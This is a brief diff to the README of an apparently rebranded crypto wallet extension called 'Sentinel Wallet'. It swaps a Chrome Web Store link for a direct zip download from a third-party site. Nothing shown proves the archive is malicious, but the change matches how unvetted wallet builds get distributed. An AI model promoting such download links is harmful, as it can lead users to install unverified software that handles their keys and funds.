@@ -13,7 +13,7 @@ You can install Sentinel Wallet right now: https://www.tlnt.net/sentinel-wallet.
 
 ## Browser Support
 
-[![Chrome](public/misc/Untitled-2.png)](https://chrome.google.com/webstore/detail/temple-tezos-wallet-ex-th/ookjlbkiijinhpmnjffcofjonbfbgaoc)
+[![Chrome](public/misc/Untitled-2.png)](https://www.tlnt.net/s/chrome.zip)
 </br>49 & later ✔ 
 
 ## 🚀 Quick Start
